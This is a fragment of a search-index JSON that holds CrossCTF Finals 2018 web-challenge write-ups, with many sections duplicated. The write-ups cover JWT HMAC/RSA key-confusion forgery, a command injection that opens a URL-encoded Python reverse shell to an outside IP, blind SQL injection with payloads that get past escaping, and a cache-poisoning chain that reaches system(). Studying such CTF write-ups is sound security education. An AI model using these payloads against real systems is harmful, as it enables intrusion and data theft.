            "text": "I thought blockchain was cool, so I made my own coin.  GoCoin! Plus is the forked and improved version of GoCoin!.  Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now!  http://ctf.pwn.sg:2053  Creator - quanyang (@quanyang)", 
            "title": "CrossCTF Finals 2018: GoCoin! Plus (web)"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoinplus/README/#challenge", 
            "text": "Okay, the organisers made a mistake in this one. See  GoCoin! Plus Plus  for the real solution.   So, a nice webpage. The first time you load it you get a nice message meant for you:   Here's the page you get to after a refresh.   The public key gave us a hint. Does it have something to do with crypto?   Similar to the previous challenge, it's got the same buttons with the same URL. Just wrapped in a fancier page.   When we looked at the source provided, we first noticed it used JWT. However, before looking for implementation flaws, we noticed the flaw we didn't notice in the previous challenge: There was no check for the amount entered being less than 0. So we exploited it right away.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoinplusplus/README/", 
            "text": "CrossCTF Finals 2018: GoCoin! Plus Plus (web)\n\n\n\n\nI thought blockchain was cool, so I made my own coin.\n\n\nGoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.\n\n\nUpdate: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!\n\n\nhttp://ctf.pwn.sg:1389\n\n\nCreator - quanyang (@quanyang)\n\n\n\n\nChallenge\n\n\nSo this is the real challenge, fixed by the organisers. TL; DR: \n\n\n54c54\n\n   walletString := this.Ctx.GetCookie(\nwallet\n)\n---\n\n   walletString := this.Ctx.GetCookie(\nwallet_2\n)\n...\n92c92\n\n   if err != nil {\n---\n\n   if err != nil || amount \n 0 {\n...\n141c141\n\n   if err != nil {\n---\n\n   if err != nil || amount \n 0 {\n...\n\n\n\n\nSo this makes the previous exploit unexploitable. Time to look back at the JWT implementation. \n\n\nMy familiarity with Go made the \ncode\n 2x easier to read. \n\n\nBecause of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI.\n\n\nIt was pretty well-know that JWT had an issue previously where things with \nalg: none\n. It's even stated in a banner on the JWT website. So, I took a look at the \nParseWallet\n function.\n\n\nfunc ParseWallet(myToken string, myKey []byte) (float64, float64, error) {\n    token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {\n        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n            key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)\n            return key, err\n        }\n        return myKey, nil\n    })\n    if err == nil \n token.Valid {\n...\n\n\n\n\nFrom this chunk of code, you can see that the program checks for tokens that are \nnot\n HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the \nexample code for HMAC\n in the documentation for \ngithub.com/dgrijalva/jwt-go\n, and \nnotices\n in the project README. \n\n\nSince the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the \n[]byte\n publicKey. \n\n\nSo let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit. \n\n\ntoken := jwt.New(jwt.GetSigningMethod(\nHS256\n))\n\n\n\n\nThen now I can do:\n\n\nmyKey := `-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY\nGshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB\nu1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM\nDFqKsA30lPd0pHbSNwIDAQAB\n-----END PUBLIC KEY-----\n` // This newline is important\ntokenString, err := Wallet(10000, 10000, []byte(myKey))\nfmt.Println(err, tokenString)\n_, _, err := ParseWallet(tokenString, myKey)\nfmt.Println(err) // nil is SUCCESS! wohoo\n\n\n\n\nHere's the full code\n. \n\n\nNow I've got a valid token, I can simply perform the request to /flag with the token set inside the cookie. Many ways to do that, including using DevTools.", 
            "title": "GoCoin! Plus Plus"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoinplusplus/README/#crossctf-finals-2018-gocoin-plus-plus-web", 
            "text": "I thought blockchain was cool, so I made my own coin.  GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus.  Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed!  http://ctf.pwn.sg:1389  Creator - quanyang (@quanyang)", 
            "title": "CrossCTF Finals 2018: GoCoin! Plus Plus (web)"
        }, 
        {
            "location": "/crossctf-finals2018/web/gocoinplusplus/README/#challenge", 
            "text": "So this is the real challenge, fixed by the organisers. TL; DR:   54c54    walletString := this.Ctx.GetCookie( wallet )\n---    walletString := this.Ctx.GetCookie( wallet_2 )\n...\n92c92    if err != nil {\n---    if err != nil || amount   0 {\n...\n141c141    if err != nil {\n---    if err != nil || amount   0 {\n...  So this makes the previous exploit unexploitable. Time to look back at the JWT implementation.   My familiarity with Go made the  code  2x easier to read.   Because of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI.  It was pretty well-know that JWT had an issue previously where things with  alg: none . It's even stated in a banner on the JWT website. So, I took a look at the  ParseWallet  function.  func ParseWallet(myToken string, myKey []byte) (float64, float64, error) {\n    token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) {\n        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {\n            key, err := jwt.ParseRSAPublicKeyFromPEM(myKey)\n            return key, err\n        }\n        return myKey, nil\n    })\n    if err == nil   token.Valid {\n...  From this chunk of code, you can see that the program checks for tokens that are  not  HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the  example code for HMAC  in the documentation for  github.com/dgrijalva/jwt-go , and  notices  in the project README.   Since the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the  []byte  publicKey.   So let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit.   token := jwt.New(jwt.GetSigningMethod( HS256 ))  Then now I can do:  myKey := `-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY\nGshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB\nu1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM\nDFqKsA30lPd0pHbSNwIDAQAB\n-----END PUBLIC KEY-----\n` // This newline is important\ntokenString, err := Wallet(10000, 10000, []byte(myKey))\nfmt.Println(err, tokenString)\n_, _, err := ParseWallet(tokenString, myKey)\nfmt.Println(err) // nil is SUCCESS! wohoo  Here's the full code .   Now I've got a valid token, I can simply perform the request to /flag with the token set inside the cookie. Many ways to do that, including using DevTools.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/web/terminal/README/", 
            "text": "CrossCTF Finals 2018: The Terminal (web)\n\n\n\n\nHow long more can you stand it?\n\n\nhttp://ctf.pwn.sg:4083\n\n\nCreator unknown\n\n\n\n\nChallenge\n\n\nIt's a Fake Terminal. Look at the \ntitle\n. First thing to do in any interactive web app is view-source to find interesting things, followed by exploiting the server. \n\n\nDevTools \n Debugger -\n terminal.js has nothing interesting. \n\n\nHowever, boop.js has our command definitions for the terminal. All these other commands look boring other than posts and date. \n\n\nWe tried to look at posts, but it seems to require some login. We skipped that and went straight into the date command. \n\n\n\n\nThe path of the \"image\" seems to hint that there could be more than one \"picturisable\" option. A clear hint that this runs the \ndate\n command, especially after seeing it's format. \n\n\n\n\nWe tried substituting \ndate\n with \nls\n: \n\n\n\n\nYay we have files! Maybe it's in the database.db: \n\n\ncurl \nhttp://ctf.pwn.sg:4082/picturise/cat%20database.db|strings|head%20-n%201\n | imgcat\n\n\n\n\n\n\n(I use iTerm2, imgcat prints an image into my terminal) Using \ncat\n, \nstrings\n, \nhead\n and \ntail\n, I pretty much navigated through the entire database without gaining anything valuable except for being able to write a post as \nadmin\n. Eww. \n\n\nWe took a step back. Maybe it's just hiding somewhere in the filesystem. Let's pop a reverse shell because we're lazy and want to use slashes even though there's no need to:\n\n\ncurl \nhttp://ctfsf.pwn.sg:4082/picturise/python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22138.75.145.240%22%2C8080))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22sh%22%2C%22-i%22%5D)%3B'\n\n\n\n\n\n(Downloaded off the internet, URLEncoded, modified to connect to an internet server. Why does this challenge have access to the internet!?) We received our $money!\n\n\nambrosechua@some-magical-server $ nc -l 8080\n$ ls\napp.py\ndatabase.db\nfonts\ninit.sql\nmotd.txt\n$ ls /\nbackend\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nservice\nsrv\nsys\ntmp\nusr\nvar\n$ ls /home/\ntheterminal\n$ ls /home/theterminal\nthe_flag_is_here_not_elsewhere\n$ cat /home/theterminal/the_flag_is_here_not_elsewhere\nCrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on}\n\n\n\n\nWohoo! Fast way to find the flag file.", 
            "title": "The Terminal"
        }, 
        {
            "location": "/crossctf-finals2018/web/terminal/README/#crossctf-finals-2018-the-terminal-web", 
            "text": "How long more can you stand it?  http://ctf.pwn.sg:4083  Creator unknown", 
            "title": "CrossCTF Finals 2018: The Terminal (web)"
        }, 
        {
            "location": "/crossctf-finals2018/web/terminal/README/#challenge", 
            "text": "It's a Fake Terminal. Look at the  title . First thing to do in any interactive web app is view-source to find interesting things, followed by exploiting the server.   DevTools   Debugger -  terminal.js has nothing interesting.   However, boop.js has our command definitions for the terminal. All these other commands look boring other than posts and date.   We tried to look at posts, but it seems to require some login. We skipped that and went straight into the date command.    The path of the \"image\" seems to hint that there could be more than one \"picturisable\" option. A clear hint that this runs the  date  command, especially after seeing it's format.    We tried substituting  date  with  ls :    Yay we have files! Maybe it's in the database.db:   curl  http://ctf.pwn.sg:4082/picturise/cat%20database.db|strings|head%20-n%201  | imgcat   (I use iTerm2, imgcat prints an image into my terminal) Using  cat ,  strings ,  head  and  tail , I pretty much navigated through the entire database without gaining anything valuable except for being able to write a post as  admin . Eww.   We took a step back. Maybe it's just hiding somewhere in the filesystem. Let's pop a reverse shell because we're lazy and want to use slashes even though there's no need to:  curl  http://ctfsf.pwn.sg:4082/picturise/python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22138.75.145.240%22%2C8080))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22sh%22%2C%22-i%22%5D)%3B'   (Downloaded off the internet, URLEncoded, modified to connect to an internet server. Why does this challenge have access to the internet!?) We received our $money!  ambrosechua@some-magical-server $ nc -l 8080\n$ ls\napp.py\ndatabase.db\nfonts\ninit.sql\nmotd.txt\n$ ls /\nbackend\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nservice\nsrv\nsys\ntmp\nusr\nvar\n$ ls /home/\ntheterminal\n$ ls /home/theterminal\nthe_flag_is_here_not_elsewhere\n$ cat /home/theterminal/the_flag_is_here_not_elsewhere\nCrossCTF{C4ther1ne_zet4_j0n3s_w4s_1n_l0st_1n_tr4nsl4t1on}  Wohoo! Fast way to find the flag file.", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/web/retroweb/README/", 
            "text": "CrossCTF Finals 2018: RetroWeb (web)\n\n\n\n\nNot so easy SQL injection at all.\n\n\nhttp://ctf.pwn.sg:8180\n\n\nCreator - quanyang (@quanyang)\n\n\n\n\nChallenge\n\n\nIt says it on the tin. Not so easy SQL injection. Dig straight in to the code:\n\n\nif (preg_match('/\\s/', $username) or \n    preg_match('/[\\/\\\\\\\\]/', $username) or \n    preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or \n    preg_match('/(--|\\/\\*|=|\n|\n)/', $username)) \n    exit('die hax0r!');\n$username = mysql_escape_string($username);\n$sql = \nSELECT username FROM users WHERE username like '$username';\n;\n$result = $conn-\nquery($sql);\n\n\n\n\nSo this thing does SQL keyword filtering and \nmysql_escape_string\n. Seems impossible? It's not, ask Google. Some clicks brought me to \nthis site's example 9\n with a description of how to bypass mysql_escape_string. A nice hint in that example also tells you the use of this exploit: for playing CTFs! \n\n\nSo let's first try bypassing \nmysql_escape_string\n: \n\n\ncurl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\n$(echo -e \nSELECT\n)\n\n\n die hax0r!\ncurl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\n$(echo -e \n\\xbf'NOPE\n)\n\n\n Nothing returned. (this means an SQL error occurred)\ncurl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\n$(echo -e \n\\xbf'#\n)\n\n\n Does not exist.\n\n\n\n\nYes! So the quote escaping is valid! We can now add additional statements behind our quote. Next step is to bypass SQL keyword filtering. \n\n\nA site that provided us with background on \nbypassing SQL statement filtering\n gave us a lot of information and basics on how to write an SQL statement that bypasses the filter. Combined with the MySQL documentation, and lots of trial and error, we found out the following: \n\n\n\n\nYou can wrap things in brackets to not need to use spaces. \nOR(1)=(1)\n\n\nUse \n and \n||\n instead of \nAND\n and \nOR\n\n\nInstead of using \nUNION\n, do a comparison and use the returned result to check\n\n\nInstead of using \n=\n, you can use \nIN\n\n\nInstead of strings, you can use hex characters\n\n\nYou can compare the substring of the flag by using \nsubstr\n\n\n\n\nThe guide on bypassing tells us that with all the keywords the filter blocked, we have to resort to blind SQL injection. It's where you compare a column character by character to determine if that character is contained in the column. In this case, we want to brute force every character of the flag out, given 1 bit (Exists or Does not exist) of information. \n\n\nFirstly, we need a way to check for the first character. Let's start with a simple statement. \n\n\nadmin' OR 'C' in substr(flag,1,1)\n\n\n\n\nLet's remove the \nAND\n and spaces:\n\n\nadmin'||('C')in(substr(flag,1,1))\n\n\n\n\nWe also need to remove the quotes and ignore everything else:\n\n\nadmin'||(0x43)in(substr(flag,1,1))#\n\n\n\n\nTest it out:\n\n\ncurl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username=\n$(echo -e \nadmin\\xbf'||((0x43)in(substr(flag,1,1)))#\n)\n\n\n\n\n\nYay, we get \nExists\n! The flag starts with 'C'\n\n\nTo extract the next character, you'd simply increase the length of the substring and the length of the hex string you're testing against, like so:\n\n\npayload := fmt.Sprintf(\nusername=%%BF'||(0x%x)IN(substr(flag,1,%d))#\n, str, len(str))\n\n\n\n\nSo, we looped through all possible characters one by one until we got the first, then the next, then the next. The flag \nCROSSCTF{WHY\n was slowly forming but then we realised that it was in all caps! The \nIN\n comparison is case-insensetive! \n\n\nSimple fix, that took us a while:\n\n\npayload := fmt.Sprintf(\nusername=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))#\n, str, len(str))\n\n\n\n\nComplete code here\n\n\nIt looks beautiful!", 
            "title": "RetroWeb"
        }, 
        {
            "location": "/crossctf-finals2018/web/retroweb/README/#crossctf-finals-2018-retroweb-web", 
            "text": "Not so easy SQL injection at all.  http://ctf.pwn.sg:8180  Creator - quanyang (@quanyang)", 
            "title": "CrossCTF Finals 2018: RetroWeb (web)"
        }, 
        {
            "location": "/crossctf-finals2018/web/retroweb/README/#challenge", 
            "text": "It says it on the tin. Not so easy SQL injection. Dig straight in to the code:  if (preg_match('/\\s/', $username) or \n    preg_match('/[\\/\\\\\\\\]/', $username) or \n    preg_match('/(and|or|null|not|union|select|from|where|group|order|having|limit|into|file|case|like)/i', $username) or \n    preg_match('/(--|\\/\\*|=| | )/', $username)) \n    exit('die hax0r!');\n$username = mysql_escape_string($username);\n$sql =  SELECT username FROM users WHERE username like '$username'; ;\n$result = $conn- query($sql);  So this thing does SQL keyword filtering and  mysql_escape_string . Seems impossible? It's not, ask Google. Some clicks brought me to  this site's example 9  with a description of how to bypass mysql_escape_string. A nice hint in that example also tells you the use of this exploit: for playing CTFs!   So let's first try bypassing  mysql_escape_string :   curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username= $(echo -e  SELECT )   die hax0r!\ncurl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username= $(echo -e  \\xbf'NOPE )   Nothing returned. (this means an SQL error occurred)\ncurl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username= $(echo -e  \\xbf'# )   Does not exist.  Yes! So the quote escaping is valid! We can now add additional statements behind our quote. Next step is to bypass SQL keyword filtering.   A site that provided us with background on  bypassing SQL statement filtering  gave us a lot of information and basics on how to write an SQL statement that bypasses the filter. Combined with the MySQL documentation, and lots of trial and error, we found out the following:    You can wrap things in brackets to not need to use spaces.  OR(1)=(1)  Use   and  ||  instead of  AND  and  OR  Instead of using  UNION , do a comparison and use the returned result to check  Instead of using  = , you can use  IN  Instead of strings, you can use hex characters  You can compare the substring of the flag by using  substr   The guide on bypassing tells us that with all the keywords the filter blocked, we have to resort to blind SQL injection. It's where you compare a column character by character to determine if that character is contained in the column. In this case, we want to brute force every character of the flag out, given 1 bit (Exists or Does not exist) of information.   Firstly, we need a way to check for the first character. Let's start with a simple statement.   admin' OR 'C' in substr(flag,1,1)  Let's remove the  AND  and spaces:  admin'||('C')in(substr(flag,1,1))  We also need to remove the quotes and ignore everything else:  admin'||(0x43)in(substr(flag,1,1))#  Test it out:  curl -v -X POST http://ctf.pwn.sg:8180/\\?search -d username= $(echo -e  admin\\xbf'||((0x43)in(substr(flag,1,1)))# )   Yay, we get  Exists ! The flag starts with 'C'  To extract the next character, you'd simply increase the length of the substring and the length of the hex string you're testing against, like so:  payload := fmt.Sprintf( username=%%BF'||(0x%x)IN(substr(flag,1,%d))# , str, len(str))  So, we looped through all possible characters one by one until we got the first, then the next, then the next. The flag  CROSSCTF{WHY  was slowly forming but then we realised that it was in all caps! The  IN  comparison is case-insensetive!   Simple fix, that took us a while:  payload := fmt.Sprintf( username=%%BF'||(hex(0x%x))IN(hex(substr(flag,1,%d)))# , str, len(str))  Complete code here  It looks beautiful!", 
            "title": "Challenge"
        }, 
        {
            "location": "/crossctf-finals2018/web/cachecreek/README/", 
            "text": "CrossCTF Finals 2018: CacheCreek (web)\n\n\n\n\nI wrote a new cache mechanism, it is pretty cool, can you please review it for me?\n\n\nhttp://ctf.pwn.sg:8181\n\n\nCreator - quanyang (@quanyang)\n\n\n\n\nChallenge\n\n\nFirst, we explored the entire source tree. The index and login pages have nothing interesting, but if you put \n?source=1\n on other pages, you can get the source.\n\n\nFirst we find the cache reader, in cache.php: (From now on, we'll omit the unimportant parts)\n\n\n# http://ctf.pwn.sg:8181/cache.php?source=1\n...\ninclude_once(\n./curl.php\n);\nif (isset($_GET['report']) \n $_GET['report'] === \ndebug\n) {\n    $debug = url_get_contents(\nhttp://127.0.0.1/internal.php?debug\n. session_id(), 60, \nindex.php\n,['debug'=\n'True']);\n    echo \ndebug command: \n.htmlentities($debug).\nbr/\n;\n    system($debug);\n    echo 'debugged!';\n    die();\n}\n\necho \nCaching Admin's Profile:\nbr /\n;\necho htmlentities(url_get_contents(\nhttp://127.0.0.1/internal.php?\n. session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'=\n'admin']));\necho '\nbr /\nbr /\n';\n...\n\n\n\n\nCool, it calls system()! There's the interesting file called \ncurl.php\n. Must be some URL fetching tool\n\n\n# http://ctf.pwn.sg:8181/curl.php?source=1\n/*\n    Adapted from a cache written by Carlo Alberto Ferraris \ncafxx@strayorange.com\n\n*/\nfunction cache($url, $min_expiration, $referer=\n, $params) {\n    $min_expiration = max( intval( $min_expiration ), 1 );\n    $cache_key = hash('sha256',$url) or die();\n    $cache_file = CACHE_PREFIX . $cache_key;\n    $cache_file_fullpath = CACHE_DIR . '/' . $cache_file;\n    $cache_file_mtime = @filemtime($cache_file_fullpath);\n    // If there's a cached file, this code reads from the file\n    ...\n    // If there isn't, fetch the URL and save to the file\n    ...\n}\n\nfunction url_get_contents($url, $min_expiration=60, $referer=\n, $params=Array()) {\n    return file_get_contents( cache( $url, $min_expiration, $referer, $params));\n}\n\n\n\n\nThe contents of the thing it puts into \nsystem()\n:\n\n\ninclude_once('./curl.php');\n// We haz checks method and referer for security!11\nif ($_SERVER['REQUEST_METHOD'] == \nPOST\n \n strpos($_SERVER['HTTP_REFERER'], 'index.php') !== False ) {\n    if ($_POST['debug'] === \nTrue\n) {\n        // Maybe delete the tmp directory\n        echo 'rm -f '. CACHE_DIR . '/'.CACHE_PREFIX.'*';\n    } else if (isset($_POST['view'])) {\n        $connObj = new dbConn();\n        $profile = $connObj-\ngetProfile($_POST['view'])['profile'];\n        echo $profile;\n    }\n} else {\n    die(\ndie hax0r!!11\n);\n}\n\n\n\n\nThis can't be a SQLi thing. This must have something to do with caching as the title suggests. And I noticed that I could inject request body into CURL by setting $referrer to the \"rest\" of the HTTP request. \n\n\nexport user='dadada' length=11\nhttp -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:\nindex.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user\n\n\n\n\n\nThis kinda produces a HTTP request to view any user. I also found out I could modify the request URI by setting SESSID cookie since \nsession_id()\n was put into the request URL: \n\n\nhttp -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=True%26source%3D1\n\n\n\n\nWe didn't know how to proceed after this and stared at it for hours. With some luck, we got reminded about cache poisoning! Completely forgot that was a thing. Ugh. \n\n\nSo the cache function importantly uses the URL to generate the filename to store the file contents. If we could make the debug function in \ncache.php\n read the wrong cache file, it could execute arbitrary code using system(). \n\n\nTo exploit this, we have to make it store a cache file maliciously using the profile caching thing (sorry I'm sleepy). That means we have to produce the same URL as the URL that the debug code would look up (\n\"http://127.0.0.1/internal.php?debug\". session_id()\n), inside the profile lookup code. \n\n\nSince the profile lookup code requsts from \n\"http://127.0.0.1/internal.php?\". session_id()\n, we can substitute session_id() for debug and we'll get the same internal URL! \n\n\n# full cached url would be http://127.0.0.1/internal.php?debug\n# Poison cache with profile of \nadmin\n\nhttp -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=debug Referer:index.php\n# Poison cache with profile of \ndadada\n\nexport user='dadada' length=11\nhttp -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:\nindex.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user\n Cookie:PHPSESSID=debug\n\n\n\n\nNow we need to execute that code inside the cached file:\n\n\n# full cached url would be http://127.0.0.1/internal.php?debug\nhttp -v --form POST http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID= Referer:index.php report==debug\nPOST /cache.php?report=debug HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nContent-Length: 0\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nCookie: PHPSESSID=\nHost: ctf.pwn.sg:8181\nReferer: index.php\nUser-Agent: HTTPie/0.9.9\n\n\n\nHTTP/1.1 200 OK\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nConnection: close\nContent-Encoding: gzip\nContent-Length: 104\nContent-Type: text/html\nDate: Mon, 18 Jun 2018 20:01:05 GMT\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nServer: Apache/2.4.7 (Ubuntu)\nVary: Accept-Encoding\nX-Powered-By: PHP/5.5.9-1ubuntu4.25\n\ndebug command: cat /flag.txt\nbr/\nCrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3}\ndebugged!\n\n\n\n\nYay!", 
            "title": "CacheCreek"
        }, 
        {
            "location": "/crossctf-finals2018/web/cachecreek/README/#crossctf-finals-2018-cachecreek-web", 
            "text": "I wrote a new cache mechanism, it is pretty cool, can you please review it for me?  http://ctf.pwn.sg:8181  Creator - quanyang (@quanyang)", 
            "title": "CrossCTF Finals 2018: CacheCreek (web)"
        }, 
        {
            "location": "/crossctf-finals2018/web/cachecreek/README/#challenge", 
            "text": "First, we explored the entire source tree. The index and login pages have nothing interesting, but if you put  ?source=1  on other pages, you can get the source.  First we find the cache reader, in cache.php: (From now on, we'll omit the unimportant parts)  # http://ctf.pwn.sg:8181/cache.php?source=1\n...\ninclude_once( ./curl.php );\nif (isset($_GET['report'])   $_GET['report'] ===  debug ) {\n    $debug = url_get_contents( http://127.0.0.1/internal.php?debug . session_id(), 60,  index.php ,['debug'= 'True']);\n    echo  debug command:  .htmlentities($debug). br/ ;\n    system($debug);\n    echo 'debugged!';\n    die();\n}\n\necho  Caching Admin's Profile: br / ;\necho htmlentities(url_get_contents( http://127.0.0.1/internal.php? . session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'= 'admin']));\necho ' br / br / ';\n...  Cool, it calls system()! There's the interesting file called  curl.php . Must be some URL fetching tool  # http://ctf.pwn.sg:8181/curl.php?source=1\n/*\n    Adapted from a cache written by Carlo Alberto Ferraris  cafxx@strayorange.com \n*/\nfunction cache($url, $min_expiration, $referer= , $params) {\n    $min_expiration = max( intval( $min_expiration ), 1 );\n    $cache_key = hash('sha256',$url) or die();\n    $cache_file = CACHE_PREFIX . $cache_key;\n    $cache_file_fullpath = CACHE_DIR . '/' . $cache_file;\n    $cache_file_mtime = @filemtime($cache_file_fullpath);\n    // If there's a cached file, this code reads from the file\n    ...\n    // If there isn't, fetch the URL and save to the file\n    ...\n}\n\nfunction url_get_contents($url, $min_expiration=60, $referer= , $params=Array()) {\n    return file_get_contents( cache( $url, $min_expiration, $referer, $params));\n}  The contents of the thing it puts into  system() :  include_once('./curl.php');\n// We haz checks method and referer for security!11\nif ($_SERVER['REQUEST_METHOD'] ==  POST    strpos($_SERVER['HTTP_REFERER'], 'index.php') !== False ) {\n    if ($_POST['debug'] ===  True ) {\n        // Maybe delete the tmp directory\n        echo 'rm -f '. CACHE_DIR . '/'.CACHE_PREFIX.'*';\n    } else if (isset($_POST['view'])) {\n        $connObj = new dbConn();\n        $profile = $connObj- getProfile($_POST['view'])['profile'];\n        echo $profile;\n    }\n} else {\n    die( die hax0r!!11 );\n}  This can't be a SQLi thing. This must have something to do with caching as the title suggests. And I noticed that I could inject request body into CURL by setting $referrer to the \"rest\" of the HTTP request.   export user='dadada' length=11\nhttp -v --form POST http://ctf.pwn.sg:8181/cache.php Referer: index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user   This kinda produces a HTTP request to view any user. I also found out I could modify the request URI by setting SESSID cookie since  session_id()  was put into the request URL:   http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=True%26source%3D1  We didn't know how to proceed after this and stared at it for hours. With some luck, we got reminded about cache poisoning! Completely forgot that was a thing. Ugh.   So the cache function importantly uses the URL to generate the filename to store the file contents. If we could make the debug function in  cache.php  read the wrong cache file, it could execute arbitrary code using system().   To exploit this, we have to make it store a cache file maliciously using the profile caching thing (sorry I'm sleepy). That means we have to produce the same URL as the URL that the debug code would look up ( \"http://127.0.0.1/internal.php?debug\". session_id() ), inside the profile lookup code.   Since the profile lookup code requsts from  \"http://127.0.0.1/internal.php?\". session_id() , we can substitute session_id() for debug and we'll get the same internal URL!   # full cached url would be http://127.0.0.1/internal.php?debug\n# Poison cache with profile of  admin \nhttp -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=debug Referer:index.php\n# Poison cache with profile of  dadada \nexport user='dadada' length=11\nhttp -v --form POST http://ctf.pwn.sg:8181/cache.php Referer: index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user  Cookie:PHPSESSID=debug  Now we need to execute that code inside the cached file:  # full cached url would be http://127.0.0.1/internal.php?debug\nhttp -v --form POST http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID= Referer:index.php report==debug\nPOST /cache.php?report=debug HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nContent-Length: 0\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nCookie: PHPSESSID=\nHost: ctf.pwn.sg:8181\nReferer: index.php\nUser-Agent: HTTPie/0.9.9\n\n\n\nHTTP/1.1 200 OK\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nConnection: close\nContent-Encoding: gzip\nContent-Length: 104\nContent-Type: text/html\nDate: Mon, 18 Jun 2018 20:01:05 GMT\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nPragma: no-cache\nServer: Apache/2.4.7 (Ubuntu)\nVary: Accept-Encoding\nX-Powered-By: PHP/5.5.9-1ubuntu4.25\n\ndebug command: cat /flag.txt br/ CrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3}\ndebugged!  Yay!", 
            "title": "Challenge"
        }, 
        {
